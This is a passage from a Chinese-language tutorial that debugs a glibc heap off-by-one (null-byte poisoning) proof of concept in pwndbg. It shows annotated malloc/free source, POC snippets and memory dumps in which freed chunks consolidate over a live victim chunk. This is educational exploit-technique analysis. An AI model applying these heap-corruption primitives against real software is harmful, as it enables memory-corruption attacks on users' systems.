class="number">0x0000000000000000</span></span><br><span class="line">    #set_head[remainder]</span><br><span class="line"><span class="number">0x555555757c80</span>:<span class="number">0x00007ffff7dcdca0</span><span class="number">0x00007ffff7dcdca0</span></span><br><span class="line">    <span class="meta">#fd#bk</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555758160</span>:<span class="number">0x00000000000004f0</span><span class="number">0x0000000000000000</span></span><br><span class="line">    #原：<span class="number">0x0000000000000a00</span></span><br><span class="line">    #set_foot[remainder]</span><br><span class="line"><span class="number">0x555555758170</span>:<span class="number">0x0000000000000a10</span><span class="number">0x0000000000000510</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555758680</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555758790</span>:<span class="number">0x0000000000000000</span><span class="number">0x000000000001f871</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x5555557588f0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x555555757c70</span> —▸ <span class="number">0x7ffff7dcdca0</span> (main_arena+<span class="number">96</span>) ◂— <span class="number">0x555555757c70</span> <span class="comment">/* &#x27;p|uUUU&#x27; */</span></span><br><span class="line">##############################################################################</span><br><span class="line">                &#125;</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim); <span class="comment">//p==0x555555757770</span></span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p; <span class="comment">//返回申请到的堆块</span></span><br></pre></td></tr></table></figure><p>最终结果如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">800</span>gx <span class="number">0x555555757000</span></span><br><span class="line"><span class="number">0x555555757000</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000251</span> #tcache_perthread_struct</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757250</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000511</span> <span class="meta">#a(malloc)</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757760</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000511</span> #b1(<span class="built_in">malloc</span>)</span><br><span class="line"><span class="number">0x555555757770</span>:<span class="number">0x00007ffff7dce210</span><span class="number">0x00007ffff7dce210</span> <span class="meta">#unsortedbin指针不会被清空</span></span><br><span class="line"><span class="number">0x555555757780</span>:<span class="number">0x0000555555757760</span><span class="number">0x0000555555757760</span> <span class="meta">#largebin指针不会清空</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757c70</span>:<span class="number">0x0000000000000000</span><span class="number">0x00000000000004f1</span> <span class="meta">#remainder(unsortedbin)</span></span><br><span class="line"><span class="number">0x555555757c80</span>:<span class="number">0x00007ffff7dcdca0</span><span class="number">0x00007ffff7dcdca0</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555758160</span>:<span class="number">0x00000000000004f0</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555758170</span>:<span class="number">0x0000000000000a10</span><span class="number">0x0000000000000510</span> <span class="meta">#c(malloc)</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555758680</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> <span class="meta">#barrier(malloc)</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555758790</span>:<span class="number">0x0000000000000000</span><span class="number">0x000000000001f871</span> #top_chunk</span><br><span class="line">......</span><br><span class="line"><span class="number">0x5555557588f0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt; unsortedbin</span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x555555757c70</span> —▸ <span class="number">0x7ffff7dcdca0</span> (main_arena+<span class="number">96</span>) ◂— <span class="number">0x555555757c70</span> <span class="comment">/* &#x27;p|uUUU&#x27; */</span></span><br><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x555555757000</span></span><br><span class="line">Size: <span class="number">0x251</span></span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x555555757250</span></span><br><span class="line">Size: <span class="number">0x511</span></span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x555555757760</span></span><br><span class="line">Size: <span class="number">0x511</span></span><br><span class="line"></span><br><span class="line"><span class="function">Free <span class="title">chunk</span> <span class="params">(unsortedbin)</span> | PREV_INUSE</span></span><br><span class="line"><span class="function">Addr: 0x555555757c70</span></span><br><span class="line"><span class="function">Size: 0x4f1</span></span><br><span class="line"><span class="function">fd: 0x7ffff7dcdca0</span></span><br><span class="line"><span class="function">bk: 0x7ffff7dcdca0</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">Allocated chunk</span></span><br><span class="line"><span class="function">Addr: 0x555555758160</span></span><br><span class="line"><span class="function">Size: 0x00</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">pwndbg&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>为了之后的叙述方便，我们将现在处于 unsortedbin 中的那个堆块称为 remainder。</p></blockquote><p>如果细心的话可以发现上述代码框中有一个大小为 0x00 的堆块，并且在正常情况下 heap 命令应该额外打印出 c、barrier 和 top_chunk 这三个堆块；仔细想想就可以知道由于我们在 POC 中将 b 堆块的大小通过 off-by-one 减小了 0x10，因此在对堆块进行切割之后会“多出来 0x10”的空间，<strong>由于堆块的虚拟地址空间都是连续的</strong>，这样会导致 gdb 认为此堆块的大小为 0x00。<br>接下来我们继续调试，如下代码中会申请大小为 0x480 的堆块：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We malloc &#x27;b2&#x27;, our &#x27;victim&#x27; chunk.\n&quot;</span>);</span><br><span class="line"><span class="comment">// Typically b2 (the victim) will be a structure with valuable pointers that we want to control</span></span><br><span class="line"></span><br><span class="line">b2 = <span class="built_in">malloc</span>(<span class="number">0x480</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;b2: %p\n&quot;</span>,b2);</span><br></pre></td></tr></table></figure><p>现在的 last_remainder 为空，如下图所示：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1620118719478-bf4930c8-7ce8-4012-a27f-0126893d21f9.png#clientId=u3c0ab4c2-3592-4&from=drop&id=u279437b0&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-05-04%2016.58.27.png&originHeight=220&originWidth=2120&originalType=binary&size=37377&status=done&style=none&taskId=u2b01eab8-621d-4e7e-801a-07ac223bfaa" alt="截屏2021-05-04 16.58.27.png"><br>可以遇见的是我们会将 remainder（不是 last_remainder）这个堆块先整理到 largebin 中然后对其进行切割：<br>首先放入 largebin 中：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1620120286133-5d1cc5b9-3c12-4ce6-8c5f-84759c24b05e.png#clientId=u3c0ab4c2-3592-4&from=drop&id=u8a66caae&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-05-04%2017.24.42.png&originHeight=536&originWidth=2752&originalType=binary&size=89032&status=done&style=none&taskId=ufa446f03-8462-4310-924d-498951659c4" alt="截屏2021-05-04 17.24.42.png"></p><blockquote><p>注意 largebin 链上的 0x4c0 并不代表其中堆块的实际结构，具体原因参见 largebin 数据结构。</p></blockquote><p>因为 nb 对应大小的 largebin 链表上没有合适的堆块，标记在 binmap 中标记 bit 之后准备对这个堆块进行切割：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1620132786606-8342cd26-dc33-476e-92dd-45635c8bd45c.png#clientId=u3c0ab4c2-3592-4&from=drop&id=WwuZR&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-05-04%2020.52.52.png&originHeight=1800&originWidth=2880&originalType=binary&size=477434&status=done&style=none&taskId=u8209a19e-bf8f-4ab3-9204-76e661bab2e" alt="截屏2021-05-04 20.52.52.png"><br>切割的步骤和之前相同，这里不再多说，直接看一下效果：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">800</span>gx <span class="number">0x555555757000</span></span><br><span class="line"><span class="number">0x555555757000</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000251</span> #tcache_perthread_struct</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757250</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000511</span> <span class="meta">#a(malloc)</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757760</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000511</span> #b1(<span class="built_in">malloc</span>)</span><br><span class="line"><span class="number">0x555555757770</span>:<span class="number">0x00007ffff7dce210</span><span class="number">0x00007ffff7dce210</span> <span class="meta">#unsortedbin指针不会被清空</span></span><br><span class="line"><span class="number">0x555555757780</span>:<span class="number">0x0000555555757760</span><span class="number">0x0000555555757760</span> <span class="meta">#largebin指针不会清空</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757c70</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000491</span> #b2(<span class="built_in">malloc</span>)</span><br><span class="line"><span class="number">0x555555757c80</span>:<span class="number">0x00007ffff7dce0c0</span><span class="number">0x00007ffff7dce0c0</span> #指针不会被清空</span><br><span class="line"><span class="number">0x555555757c90</span>:<span class="number">0x0000555555757c70</span><span class="number">0x0000555555757c70</span> #指针不会被清空</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555758100</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000061</span> <span class="meta">#remainder(free-unsortedbin)</span></span><br><span class="line"><span class="number">0x555555758110</span>:<span class="number">0x00007ffff7dcdca0</span><span class="number">0x00007ffff7dcdca0</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555758160</span>:<span class="number">0x0000000000000060</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555758170</span>:<span class="number">0x0000000000000a10</span><span class="number">0x0000000000000510</span> <span class="meta">#c(malloc)</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555758680</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> <span class="meta">#barrier(malloc)</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555758790</span>:<span class="number">0x0000000000000000</span><span class="number">0x000000000001f871</span> #top_chunk</span><br><span class="line">......</span><br><span class="line"><span class="number">0x5555557588f0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1620133527780-6c006649-827b-49e5-aa3c-9129f400f66f.png#clientId=u3c0ab4c2-3592-4&from=ui&id=uffd6aecf&margin=%5Bobject%20Object%5D&name=QQ20210504-210518%402x.png&originHeight=1646&originWidth=2742&originalType=binary&size=199042&status=done&style=none&taskId=u5a5dad24-3f69-4ae7-ab6f-cd88d5ef699" alt="QQ20210504-210518@2x.png"><br>同样，这里 gdb 的 heap 出现了问题，这里不管他。为了方便查看，接下来的 POC 代码对 b2 堆块进行填充：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memset</span>(b2,<span class="string">&#x27;B&#x27;</span>,<span class="number">0x480</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Current b2 content:\n%s\n&quot;</span>,b2);</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">800</span>gx <span class="number">0x555555757000</span></span><br><span class="line"><span class="number">0x555555757000</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000251</span> #tcache_perthread_struct</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757250</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000511</span> <span class="meta">#a(malloc)</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757760</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000511</span> #b1(<span class="built_in">malloc</span>)</span><br><span class="line"><span class="number">0x555555757770</span>:<span class="number">0x00007ffff7dce210</span><span class="number">0x00007ffff7dce210</span> <span class="meta">#unsortedbin指针不会被清空</span></span><br><span class="line"><span class="number">0x555555757780</span>:<span class="number">0x0000555555757760</span><span class="number">0x0000555555757760</span> <span class="meta">#largebin指针不会清空</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757c70</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000491</span> #b2(<span class="built_in">malloc</span>)</span><br><span class="line"><span class="number">0x555555757c80</span>:<span class="number">0x4242424242424242</span><span class="number">0x4242424242424242</span> #填充</span><br><span class="line"><span class="number">0x555555757c90</span>:<span class="number">0x4242424242424242</span><span class="number">0x4242424242424242</span> #填充</span><br><span class="line">......</span><br><span class="line"><span class="number">0x5555557580f0</span>:<span class="number">0x4242424242424242</span><span class="number">0x4242424242424242</span> #填充</span><br><span class="line"><span class="number">0x555555758100</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000061</span> <span class="meta">#remainder(free-unsortedbin)</span></span><br><span class="line"><span class="number">0x555555758110</span>:<span class="number">0x00007ffff7dcdca0</span><span class="number">0x00007ffff7dcdca0</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555758160</span>:<span class="number">0x0000000000000060</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555758170</span>:<span class="number">0x0000000000000a10</span><span class="number">0x0000000000000510</span> <span class="meta">#c(malloc)</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555758680</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> <span class="meta">#barrier(malloc)</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555758790</span>:<span class="number">0x0000000000000000</span><span class="number">0x000000000001f871</span> #top_chunk</span><br><span class="line">......</span><br><span class="line"><span class="number">0x5555557588f0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>接下来我们对申请的 b1 堆块再次进行 free：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now we free &#x27;b1&#x27; and &#x27;c&#x27;: this will consolidate the chunks &#x27;b1&#x27; and &#x27;c&#x27; (forgetting about &#x27;b2&#x27;).\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(b1);</span><br></pre></td></tr></table></figure><p>这次 free 后会将 b1 放入到 unsortedbin 中，这个过程没有什么好说的，结果如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bin</span><br><span class="line"><span class="comment">//......</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x555555757760</span> —▸ <span class="number">0x555555758100</span> —▸ <span class="number">0x7ffff7dcdca0</span> (main_arena+<span class="number">96</span>) ◂— <span class="number">0x555555757760</span> <span class="comment">/* &#x27;`wuUUU&#x27; */</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt; x/<span class="number">800</span>gx <span class="number">0x555555757000</span></span><br><span class="line"><span class="number">0x555555757000</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000251</span> #tcache_perthread_struct</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757250</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000511</span> <span class="meta">#a(malloc)</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757760</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000511</span> #b1(<span class="built_in">free</span>)</span><br><span class="line"><span class="number">0x555555757770</span>:<span class="number">0x0000555555758100</span><span class="number">0x00007ffff7dcdca0</span> <span class="meta">#changed</span></span><br><span class="line"><span class="meta">#fd#bk</span></span><br><span class="line"><span class="number">0x555555757780</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span> <span class="meta">#changed</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757c70</span>:<span class="number">0x0000000000000510</span><span class="number">0x0000000000000490</span> <span class="meta">#changed #b2(malloc)</span></span><br><span class="line"><span class="number">0x555555757c80</span>:<span class="number">0x4242424242424242</span><span class="number">0x4242424242424242</span> #填充</span><br><span class="line"><span class="number">0x555555757c90</span>:<span class="number">0x4242424242424242</span><span class="number">0x4242424242424242</span> #填充</span><br><span class="line">......</span><br><span class="line"><span class="number">0x5555557580f0</span>:<span class="number">0x4242424242424242</span><span class="number">0x4242424242424242</span> #填充</span><br><span class="line"><span class="number">0x555555758100</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000061</span> <span class="meta">#remainder(free-unsortedbin)</span></span><br><span class="line"><span class="number">0x555555758110</span>:<span class="number">0x00007ffff7dcdca0</span><span class="number">0x00007ffff7dcdca0</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555758160</span>:<span class="number">0x0000000000000060</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555758170</span>:<span class="number">0x0000000000000a10</span><span class="number">0x0000000000000510</span> <span class="meta">#c(malloc)</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555758680</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> <span class="meta">#barrier(malloc)</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555758790</span>:<span class="number">0x0000000000000000</span><span class="number">0x000000000001f871</span> #top_chunk</span><br><span class="line">......</span><br><span class="line"><span class="number">0x5555557588f0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>接下来又是一个重点，这次 free 牵扯到堆块的合并问题：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">free</span>(c);</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1620134877077-ad8d4368-433b-47bb-9f81-4de1e349bb2f.png#clientId=u3c0ab4c2-3592-4&from=drop&id=iSgR1&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-05-04%2021.27.50.png&originHeight=1800&originWidth=2880&originalType=binary&size=477183&status=done&style=none&taskId=u1e56075b-a420-49bc-98ef-2343dacf1fc" alt="截屏2021-05-04 21.27.50.png"><br>我们调试到如上图所示的地方，我们将 malloc 源码单独的摘出来看一下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">    free_perturb (chunk2mem(p), size - <span class="number">2</span> * SIZE_SZ); <span class="comment">//清空堆块的内容</span></span><br><span class="line">-------------------------------------------------------------------</span><br><span class="line">#此时的堆块内存如下：</span><br><span class="line"><span class="number">0x555555757760</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000511</span> #b1(<span class="built_in">malloc</span>)</span><br><span class="line"><span class="number">0x555555757770</span>:<span class="number">0x0000555555758100</span><span class="number">0x00007ffff7dcdca0</span> <span class="meta">#changed</span></span><br><span class="line"><span class="meta">#fd#bk</span></span><br><span class="line"><span class="number">0x555555757780</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span> <span class="meta">#changed</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757c70</span>:<span class="number">0x0000000000000510</span><span class="number">0x0000000000000490</span> <span class="meta">#changed #b2(malloc)</span></span><br><span class="line"><span class="number">0x555555757c80</span>:<span class="number">0x4242424242424242</span><span class="number">0x4242424242424242</span></span><br><span class="line"><span class="number">0x555555757c90</span>:<span class="number">0x4242424242424242</span><span class="number">0x4242424242424242</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x5555557580f0</span>:<span class="number">0x4242424242424242</span><span class="number">0x4242424242424242</span></span><br><span class="line"><span class="number">0x555555758100</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000061</span> <span class="meta">#remainder(free-unsortedbin)</span></span><br><span class="line"><span class="number">0x555555758110</span>:<span class="number">0x00007ffff7dcdca0</span><span class="number">0x00007ffff7dcdca0</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555758160</span>:<span class="number">0x0000000000000060</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555758170</span>:<span class="number">0x0000000000000a10</span><span class="number">0x0000000000000510</span> <span class="meta">#c(free) 【malloc源码中的p堆块】</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555758680</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> <span class="meta">#barrier(malloc)【malloc源码中的nextchunk】</span></span><br><span class="line">-------------------------------------------------------------------</span><br><span class="line">    <span class="comment">/* consolidate backward */</span> <span class="comment">//向后合并</span></span><br><span class="line">    <span class="keyword">if</span> (!prev_inuse(p)) &#123; <span class="comment">//prev_inuse(p):获取p的PREV_INUSE标志位==0</span></span><br><span class="line">    <span class="comment">//进入if语句，p的PREV_INUSE标志位代表着p之前的堆块的状态，现在处于free状态</span></span><br><span class="line">      prevsize = prev_size (p); <span class="comment">//获取p的mchunk_prev_size==0xa10</span></span><br><span class="line">      size += prevsize; <span class="comment">//size=size+prevsize-&gt;size==0xa10+0x510=0xf20</span></span><br><span class="line">      p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">      <span class="comment">//#define chunk_at_offset(p, s)  ((mchunkptr) (((char *) (p)) + (s)))</span></span><br><span class="line">        <span class="comment">//p==0x555555757760</span></span><br><span class="line">      unlink(av, p, bck, fwd); <span class="comment">//对p堆块进行unlink</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>unlink 之后结果如下：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1620136248681-222f18f7-6985-4642-9c30-958a3b559571.png#clientId=u3c0ab4c2-3592-4&from=drop&id=u7a3d72ef&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-05-04%2021.50.40.png&originHeight=682&originWidth=2744&originalType=binary&size=85286&status=done&style=none&taskId=u95d92572-fbb0-4c3a-b371-e6e11c2e118" alt="截屏2021-05-04 21.50.40.png"><br>最终执行如下代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">     <span class="comment">/* get and clear inuse bit */</span></span><br><span class="line">     nextinuse = inuse_bit_at_offset(nextchunk, nextsize); <span class="comment">//nextinuse==1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> inuse_bit_at_offset(p, s)      \</span></span><br><span class="line"><span class="meta"> #(((mchunkptr) (((char *) (p)) + (s)))-&gt;mchunk_size &amp; PREV_INUSE)</span></span><br><span class="line">     <span class="comment">/* consolidate forward */</span>   <span class="comment">//向前合并</span></span><br><span class="line">     <span class="keyword">if</span> (!nextinuse) &#123; <span class="comment">//这里的nextinuse代表着p的下一个的下一个堆块的PREV_INUSE标志位情况</span></span><br><span class="line">         <span class="comment">//现在不会进入if语句</span></span><br><span class="line">unlink(av, nextchunk, bck, fwd); <span class="comment">//如果p的下一个堆块也处于free状态，则进行合并</span></span><br><span class="line">size += nextsize;</span><br><span class="line">     &#125; <span class="keyword">else</span></span><br><span class="line">clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Place the chunk in unsorted chunk list. Chunks are</span></span><br><span class="line"><span class="comment">not placed into regular bins until after they have</span></span><br><span class="line"><span class="comment">been given one chance to be used in malloc.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">     bck = unsorted_chunks(av);---------------------------------</span><br><span class="line">     fwd = bck-&gt;fd;｜</span><br><span class="line">     <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))｜--&gt;unsortedbin双向链表完整性检查</span><br><span class="line">malloc_printerr (<span class="string">&quot;free(): corrupted unsorted chunks&quot;</span>);-------</span><br><span class="line">     p-&gt;fd = fwd;----------------------------</span><br><span class="line">     p-&gt;bk = bck; ｜</span><br><span class="line">     <span class="keyword">if</span> (!in_smallbin_range(size)) ｜</span><br><span class="line">&#123; ｜</span><br><span class="line">  p-&gt;fd_nextsize = <span class="literal">NULL</span>; ｜----&gt;p堆块链入unsortedbin中</span><br><span class="line">  p-&gt;bk_nextsize = <span class="literal">NULL</span>; ｜</span><br><span class="line">&#125; ｜</span><br><span class="line">     